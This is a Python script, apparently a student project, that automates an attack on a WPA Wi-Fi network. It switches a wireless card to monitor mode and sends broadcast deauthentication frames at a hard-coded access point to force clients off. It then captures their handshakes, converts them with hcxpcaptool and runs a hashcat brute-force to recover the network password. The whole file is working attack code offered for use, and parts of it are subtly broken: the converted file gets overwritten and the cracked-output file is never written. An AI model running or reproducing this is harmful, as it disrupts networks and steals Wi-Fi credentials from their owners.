import subprocess
from scapy.all import *
from scapy.all import *
import json
import pcapy
import sys
import threading
import time

from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Elt, Dot11Beacon, Dot11ProbeResp, RadioTap
import os


def convert_pcap_to_hc22000(pcap_file, hc22000_file):
    try:
        # Run hcxpcaptool command to convert pcap to hc22000
        result = subprocess.run(['hcxpcaptool', '-o', hc22000_file, pcap_file], capture_output=True, check=True)
        print("Conversion successful!")

        # Write output to the conversion file
        with open(hc22000_file, 'wb') as f:
            f.write(result.stdout)

        print(f"Data saved to {hc22000_file}")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        print("Conversion failed.")

def crack_hashes(output_file_path):
    # Use hashcat to crack hashes with brute-force attack
    output_file = output_file_path + "_cracked.txt"  # Define output file for cracked passwords
    hashcat_cmd = ['hashcat', '-m', '22000',  output_file_path ,'-a', '3',]
    try:
        subprocess.check_call(hashcat_cmd)  # Run hashcat command
    except subprocess.CalledProcessError as e:
        print("Hash cracking failed:", e)
        return None  # Return None if hash cracking failed
    
    return output_file  # Return output file path if hash cracking succeeded

def check_cracked_password(output_file):
    # Check if password is found
    try:
        with open(output_file, 'r') as f:  # Open the output file for reading
            for line in f:
                parts = line.strip().split(':')
                if len(parts) >= 2:
                    return parts[1]  # Return cracked password
    except FileNotFoundError:
        return None
    return None

def packet_handler(pkt):
    # Capture all packets without filtering
    handshakes.append(pkt)  # Store the entire packet
    print("Packet captured:", pkt.summary())

# Initialize Wi-Fi monitor mode
os.system("sudo iwconfig wlan0 mode monitor")

# Define BSSID for deauthentication
bssid = "ac:64:62:8e:23:90"
# Deauthenticate network
pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid) / Dot11Deauth()
sendp(pkt, iface="wlan0", count=5, inter=0.1, verbose=True)

# Sniff Wi-Fi packets and handle them
handshakes = []
sniff(iface="wlan0", prn=packet_handler, timeout=90)

# Save captured handshakes to a pcap file
pcap_file = "/home/kali/Desktop/grad/hana.pcap"
wrpcap(pcap_file, handshakes)
print("Captured handshakes saved to hana.pcap")

# Convert pcap to hc format
hc22000_file = "/home/kali/Desktop/grad/output.hc22000"
convert_pcap_to_hc22000(pcap_file, hc22000_file)

# Crack hashes with hashcat
output_file = crack_hashes(hc22000_file)
if output_file:
    password = check_cracked_password(output_file)
    if password:
        print("Password recovered:", password)
else:
    print("Hash cracking failed. No output file generated.")
